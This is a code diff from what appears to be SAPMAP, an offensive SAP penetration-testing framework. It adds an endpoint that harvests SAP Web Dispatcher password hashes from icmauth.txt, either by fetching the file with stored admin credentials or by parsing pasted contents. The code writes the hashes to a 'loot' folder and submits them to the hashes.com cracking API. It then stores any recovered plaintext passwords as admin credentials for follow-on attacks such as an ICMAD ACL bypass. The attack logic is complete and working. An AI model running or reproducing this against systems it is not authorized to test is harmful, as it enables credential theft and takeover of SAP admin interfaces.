@@ -4556,6 +4556,357 @@ def create_app(api: SAPMAPApi) -> Bottle:
               "WD admin Probe Default Credentials", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/wd_extract_icmauth", method="POST")
+    def node_wd_extract_icmauth(sid):
+        """Extract WD password hashes from icmauth.txt.
+
+        Two paths:
+          1. AUTO  — when stored wd_admin credentials exist, try the
+                     admin file-viewer endpoints; if any return the
+                     icmauth body, parse + auto-lookup on hashes.com.
+          2. PASTE — when the operator pasted the file contents in
+                     the GUI modal (raw_text in body), skip the
+                     download and go straight to parse + lookup.
+
+        On AUTO path, when no endpoint serves the file, returns
+        {needs_paste: True, reason: "..."} so the GUI opens the
+        paste modal as fallback.  This is the common case — SAP
+        locks icmauth.txt behind the OS filesystem on most installs.
+
+        Hashes are saved to ``loot/wd_hashes/`` (parsed JSON + the
+        raw icmauth.txt).  Cracked plaintexts get stored on the
+        node as ``Credentials(kind="wd_admin")`` so subsequent WD
+        operations (Rediscover topology, ICMAD ACL bypass) can use
+        them without re-prompting the operator.
+        """
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        if not node.is_web_dispatcher:
+            return json.dumps({"error": "Not a Web Dispatcher node"})
+
+        body = request.json or {}
+        pasted = (body.get("raw_text") or "").strip()
+
+        # AUTO path — capture wd port + creds for the background thread.
+        wd_port, wd_https = 0, False
+        for inst in node.instances:
+            for p, svc in (inst.ports or {}).items():
+                low = (svc or "").lower()
+                if low.startswith("wd_"):
+                    wd_port = p
+                    wd_https = low == "wd_https"
+                    break
+            if wd_port:
+                break
+
+        stored_creds = None
+        for c in (node.credentials or []):
+            if getattr(c, "kind", "") == "wd_admin":
+                stored_creds = (c.username, c.password)
+                break
+
+        host = node.ip or node.hostname
+        saprouter = node.saprouter or ""
+        api_key = _get_local_setting("hashes_com_api_key")
+
+        # If no pasted text AND no stored creds: signal the GUI to open
+        # the paste modal (operator hasn't done Add WD admin credentials
+        # yet, or the WD admin endpoint doesn't expose icmauth).
+        if not pasted and not stored_creds:
+            return json.dumps({
+                "needs_paste": True,
+                "reason": "no stored wd_admin credentials on this node",
+            })
+
+        if not pasted and not wd_port:
+            return json.dumps({
+                "needs_paste": True,
+                "reason": "no WD port discovered on this node",
+            })
+
+        # Synchronous parse-only path when the operator pasted the body
+        # — no network, do it inline so the toast carries the result.
+        if pasted:
+            return _icmauth_parse_and_lookup(
+                node, sid, raw_text=pasted, source="operator_paste",
+                api_key=api_key, host=host, port=wd_port,
+            )
+
+        # AUTO path runs in a background thread; the GUI tails the
+        # console for the lookup result like every other WD action.
+        def _run():
+            try:
+                _run_body()
+            except Exception as e:
+                import traceback
+                print(f"[-] {sid}: icmauth extraction crashed: "
+                      f"{type(e).__name__}: {e}")
+                traceback.print_exc()
+
+        def _run_body():
+            from sap_wdisp_admin import download_icmauth
+            print(f"[*] {sid}: attempting icmauth.txt auto-fetch via WD "
+                  f"admin file-viewer endpoints")
+            r = download_icmauth(
+                host, wd_port, https=wd_https,
+                user=stored_creds[0], pwd=stored_creds[1],
+                timeout=8, saprouter=saprouter,
+            )
+            if not r["ok"]:
+                print(f"[-] {sid}: icmauth auto-fetch failed ({r['error']}) "
+                      f"— operator should paste the file contents via the "
+                      f"GUI modal (right-click → Extract WD password hashes)")
+                emit_finding(
+                    "INFO", sid,
+                    f"icmauth.txt auto-fetch failed ({r['error']}) — paste "
+                    f"manually via the GUI modal to continue extraction",
+                    cve="",
+                )
+                return
+            print(f"[+] {sid}: icmauth.txt fetched from {r['endpoint_used']} "
+                  f"({len(r['raw_text'])} bytes)")
+            _icmauth_parse_and_lookup(
+                node, sid, raw_text=r["raw_text"],
+                source=f"auto:{r['endpoint_used']}",
+                api_key=api_key, host=host, port=wd_port,
+            )
+
+        _bg(f"{sid}:wd_extract_icmauth",
+              "WD Extract icmauth.txt", _run)
+        return json.dumps({"status": "started"})
+
+    def _icmauth_parse_and_lookup(node, sid, *,
+                                     raw_text, source, api_key,
+                                     host, port):
+        """Parse pasted/fetched icmauth.txt, save to loot, and (if
+        api_key is set) auto-submit hex digests to hashes.com.
+
+        Returns a JSON-serializable string for the GUI endpoint.
+        Also fully prints progress to the console so it works for
+        the background-thread auto-fetch path.
+        """
+        from sap_wdisp_admin import parse_icmauth
+        try:
+            from sapmap_state import ensure_loot_dir
+            loot_dir = ensure_loot_dir("wd_hashes")
+        except Exception:
+            loot_dir = os.path.join("loot", "wd_hashes")
+            os.makedirs(loot_dir, exist_ok=True)
+
+        try:
+            parsed = parse_icmauth(raw_text)
+        except Exception as e:
+            print(f"[-] {sid}: icmauth parse error: {e}")
+            return json.dumps({"error": f"parse_error: {e}"})
+
+        if not parsed:
+            print(f"[-] {sid}: icmauth contained 0 parseable lines "
+                  f"({len(raw_text)} bytes input) — check the format "
+                  f"(expected `user:{{SHA384}}<base64>:comment` per line)")
+            return json.dumps({
+                "ok": False,
+                "error": "no_parseable_lines",
+                "parsed_count": 0,
+            })
+
+        # Persist artefacts to loot.
+        import time
+        ts = time.strftime("%Y%m%d_%H%M%S")
+        host_slug = (host or "unknown").replace(":", "_").replace("/", "_")
+        raw_path = os.path.join(
+            loot_dir, f"icmauth_{host_slug}_{port}_{ts}.txt")
+        parsed_path = os.path.join(
+            loot_dir, f"icmauth_{host_slug}_{port}_{ts}_parsed.json")
+        try:
+            with open(raw_path, "w") as f:
+                f.write(raw_text)
+            os.chmod(raw_path, 0o600)
+            with open(parsed_path, "w") as f:
+                json.dump({"source": source, "host": host, "port": port,
+                           "entries": parsed}, f, indent=2)
+            os.chmod(parsed_path, 0o600)
+        except Exception as e:
+            print(f"[-] {sid}: icmauth loot write failed: {e}")
+
+        algos = sorted({h.get("algorithm", "?") for h in parsed})
+        print(f"[+] {sid}: icmauth parsed — {len(parsed)} hash(es), "
+              f"algorithms=[{','.join(algos)}], saved to {raw_path}")
+
+        emit_finding(
+            "HIGH", sid,
+            f"WD password hashes extracted from icmauth.txt — "
+            f"{len(parsed)} user(s) [{','.join(algos)}] now eligible "
+            f"for offline cracking / hashes.com rainbow lookup",
+            cve="",
+            meta={"users": [h["username"] for h in parsed],
+                  "algorithms": algos,
+                  "source": source},
+        )
+
+        # hashes.com auto-lookup — same shape as scc_lookup_hashes_online.
+        # Skip when no API key set, or when no hashes have a hashcat mode
+        # we can submit (parsed but unknown algorithm).
+        if not api_key:
+            print(f"[*] {sid}: hashes.com auto-lookup skipped — set "
+                  f"`hashes_com_api_key` in Settings to enable rainbow "
+                  f"lookups")
+            return json.dumps({
+                "ok": True,
+                "parsed_count": len(parsed),
+                "users": [h["username"] for h in parsed],
+                "algorithms": algos,
+                "hashes_com_attempted": False,
+                "hashes_com_skipped_reason": "no API key in Settings",
+                "loot_path": raw_path,
+                "cracked_count": 0,
+            })
+
+        submittable = [h for h in parsed if h.get("hashcat_mode")]
+        if not submittable:
+            print(f"[-] {sid}: hashes.com auto-lookup skipped — no parsed "
+                  f"entries had a known hashcat mode (algorithms=[{algos}])")
+            return json.dumps({
+                "ok": True,
+                "parsed_count": len(parsed),
+                "users": [h["username"] for h in parsed],
+                "algorithms": algos,
+                "hashes_com_attempted": False,
+                "hashes_com_skipped_reason": "no known hashcat algorithms",
+                "loot_path": raw_path,
+                "cracked_count": 0,
+            })
+
+        # De-duplicate hex digests; multiple users may share a hash
+        # (default factory deployments often do).  hashes.com expects
+        # ONE hash per submission, with a fan-out on the response.
+        import urllib.request as _urlreq
+        import urllib.parse as _urlparse
+        import ssl as _ssl
+
+        post_params = [("key", api_key)]
+        hash_map = {}  # hex -> list[parsed_record]
+        for h in submittable:
+            hex_h = h["hash_hex"].lower()
+            if hex_h not in hash_map:
+                post_params.append(("hashes[]", hex_h))
+                hash_map[hex_h] = []
+            hash_map[hex_h].append(h)
+
+        print(f"[*] {sid}: hashes.com lookup — submitting "
+              f"{len(hash_map)} unique hash(es) "
+              f"(across {sum(len(v) for v in hash_map.values())} user(s))")
+
+        try:
+            req = _urlreq.Request(
+                "https://hashes.com/en/api/search",
+                data=_urlparse.urlencode(post_params).encode(),
+                method="POST",
+                headers={"Content-Type": "application/x-www-form-urlencoded",
+                         "User-Agent": "SAPMAP/1.0"},
+            )
+            ctx = _ssl.create_default_context()
+            with _urlreq.urlopen(req, timeout=15, context=ctx) as r:
+                resp_body = r.read().decode("utf-8", errors="replace")
+            resp = json.loads(resp_body)
+        except Exception as e:
+            print(f"[-] {sid}: hashes.com API error: {e}")
+            return json.dumps({
+                "ok": True,
+                "parsed_count": len(parsed),
+                "users": [h["username"] for h in parsed],
+                "algorithms": algos,
+                "hashes_com_attempted": True,
+                "hashes_com_error": str(e),
+                "loot_path": raw_path,
+                "cracked_count": 0,
+            })
+
+        if not resp.get("success"):
+            err = resp.get("message", "unknown error")
+            print(f"[-] {sid}: hashes.com: {err}")
+            return json.dumps({
+                "ok": True,
+                "parsed_count": len(parsed),
+                "users": [h["username"] for h in parsed],
+                "algorithms": algos,
+                "hashes_com_attempted": True,
+                "hashes_com_error": err,
+                "loot_path": raw_path,
+                "cracked_count": 0,
+            })
+
+        # Process founds — store cracked passwords as wd_admin credentials.
+        cracked_count = 0
+        cracked_users = []
+        for item in (resp.get("founds") or []):
+            hex_h = (item.get("hash") or "").lower()
+            plaintext = item.get("plaintext", "")
+            users_for_hash = hash_map.get(hex_h, [])
+            if not users_for_hash or not plaintext:
+                continue
+            for original in users_for_hash:
+                username = original.get("username", "?")
+                cracked_count += 1
+                cracked_users.append(username)
+                # Store as wd_admin credential.  Keep any verified
+                # cred we already have for that user; otherwise add.
+                already = False
+                for c in (node.credentials or []):
+                    if (getattr(c, "kind", "") == "wd_admin"
+                            and (getattr(c, "username", "") or "").lower()
+                                == username.lower()
+                            and (getattr(c, "password", "") or "")
+                                == plaintext):
+                        already = True
+                        break
+                if not already:
+                    node.credentials.append(Credentials(
+                        username=username, password=plaintext,
+                        client="", instance="",
+                        verified=False, kind="wd_admin",
+                    ))
+                print(f"[+] {sid}: hashes.com cracked {username} → "
+                      f"plaintext stored as wd_admin credential")
+                emit_finding(
+                    "CRITICAL", sid,
+                    f"WD admin password cracked for '{username}' via "
+                    f"hashes.com rainbow table — plaintext stored as "
+                    f"wd_admin credential, full /sap/wdisp/admin access",
+                    cve="",
+                    meta={"username": username,
+                          "algorithm": original.get("algorithm", ""),
+                          "source": "hashes.com",
+                          "icmauth_source": source},
+                )
+                # Append to cracked-loot file
+                try:
+                    cracked_path = os.path.join(loot_dir,
+                                                  "hashes_cracked.txt")
+                    with open(cracked_path, "a") as fh:
+                        fh.write(f"{host_slug}:{port}:"
+                                  f"{username}:{plaintext}\n")
+                    os.chmod(cracked_path, 0o600)
+                except Exception:
+                    pass
+
+        cost = resp.get("cost", 0)
+        print(f"[*] {sid}: hashes.com lookup complete — cracked "
+              f"{cracked_count}/{len(parsed)} user(s), cost={cost} credits")
+
+        return json.dumps({
+            "ok": True,
+            "parsed_count": len(parsed),
+            "users": [h["username"] for h in parsed],
+            "algorithms": algos,
+            "hashes_com_attempted": True,
+            "cracked_count": cracked_count,
+            "cracked_users": cracked_users,
+            "cost": cost,
+            "loot_path": raw_path,
+        })
+
     @app.route("/api/node/<sid>/check_cve_2022_22536", method="POST")
     def node_check_cve_2022_22536(sid):
         """Probe a node for CVE-2022-22536 (ICMAD) — HTTP request smuggling.
